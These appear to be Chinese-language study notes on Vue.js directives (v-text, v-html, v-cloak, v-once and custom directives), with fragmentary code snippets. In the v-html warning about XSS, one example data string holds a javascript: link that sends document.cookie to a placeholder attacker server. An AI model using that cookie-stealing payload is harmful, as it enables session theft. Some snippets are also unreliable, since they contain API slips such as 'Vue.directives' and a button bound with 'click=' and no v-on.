...
```
内置指令
    v-text  作用是向其所在的节点中渲染文本内容  与插值语法的区别：v-text会替换掉接单中的内容 而插值语法是不会的。
    例如：  
    ...
    v-html (配合cookie才能展示效果)  向指定节点中渲染包含html结构的内容  与插值语法的区别  和v-text一样  只不过是能解释data里面返回的html标签  安全问题：在网站上动态渲染任何html是非常危险的，容易导致xss攻击   一定要在可信的内容上使用v-html,永远不要用在用户提交上面
    例如：
    <div id="root">
        <h3 v-text="name"></h3>
        <h3 v-html="name"></h3>
    ...
    new Vue({
        ...
        data:{
            name:'测试工程师所描述的',
            str:'<a href=javascript:location.href="需要坏人的服务器ip地址?"+document.cookie>这种方式不要用在用户提交上面</a>'
        }
    })    
    </script>

    v-cloak  
        如果你在script中引入了一个js 但是这个js服务器反应时间是5秒才能给你响应vue.js 在vue页面中才能显示，这种情况叫js阻塞  这种情况下 使用此标签在配合css就能避免这种情况的出现  前提是js放到了body的最下面 这个指令是没有具体的值假如下面的（http://localhost:8080/vue.js）次链接响应5秒才能返回vue.js的值 网速慢的时候 页面展示{{name}}这种情况的解决方式 代码如下：
```
    <style>
        [v-cloak]{
            display: none;
    ...
    <script src="http://localhost:8080/vue.js"></script>
    <script src="days.js"></script>
    <script>
    new Vue({
        el:'#root',
...
```
    ...
    v-once  所在节点在初次动态渲染后，视为静态内容  以后的数据改变不会引起v-once所在结构的更新，可以用户优化性能
```
    <div id="root">
...
有两种写法 第一种写法为对象的形式进行书写```cxd:{}```,这种的优势就是能处理细节  第二种写法是```方法```便捷但是不能处理细节  

第一种写法的方式  vue在不同的时刻调用不同的函数例如下面的代码：

```
    <div id="root">
        <h2>当前的n值是：<span v-text="n"></span></h2>
        <h2>放到10倍的n值是：<span v-cxd="n"></span></h2>
        <button click="n++"></button>
        <hr>
        <input type="text" v-cbind:value="n">
    </div>
...
第二种写法方法的方式  这个自定义指令什么时候被调用，指令与元素成功绑定时，指令所在的模版被解析的时  例如下面的代码：
...
```
自定义指令中如果出现了名称中有c-d这种的话，在下面的命名必须加上单引号 ```'c-d'```这样去写  directives里面的this指向是win，不是vue  上面的写法是局部写法如果想要定义，如果想定义全局的话使用语法为：
```
Vue.directives('cbind',{
    bind(el,bd){
        .....
    },
    inserted(el,bd){
